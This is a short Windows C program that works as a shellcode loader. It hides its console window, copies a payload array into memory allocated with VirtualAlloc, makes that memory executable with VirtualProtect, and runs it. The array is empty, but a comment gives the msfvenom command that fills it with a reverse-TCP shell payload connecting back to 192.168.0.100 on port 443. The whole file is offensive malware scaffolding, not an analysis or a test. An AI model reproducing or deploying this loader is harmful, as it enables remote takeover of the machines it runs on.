#include <windows.h>
#pragma comment(linker, "/SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup")

unsigned char my_payload[] = {
    // SHELLCODE (ex. metasploit) ( msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.100 LPORT=443 -f c )

};
unsigned int  uxLen = sizeof(my_payload);;


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    void *my_payload_mem;
    DWORD oldprotect;

    // Allocate a memory buffer for payload
    my_payload_mem = VirtualAlloc(NULL, uxLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (my_payload_mem == NULL) {
        return 1; // Error allocating memory
    }

    // Copy payload to buffer
    memcpy(my_payload_mem, my_payload, uxLen);

    // Make buffer executable
    if (!VirtualProtect(my_payload_mem, uxLen, PAGE_EXECUTE_READ, &oldprotect)) {
        return 2; // Error setting memory protection
    }

    // Run payload
    ((void(*)())my_payload_mem)();

    return 0;
}
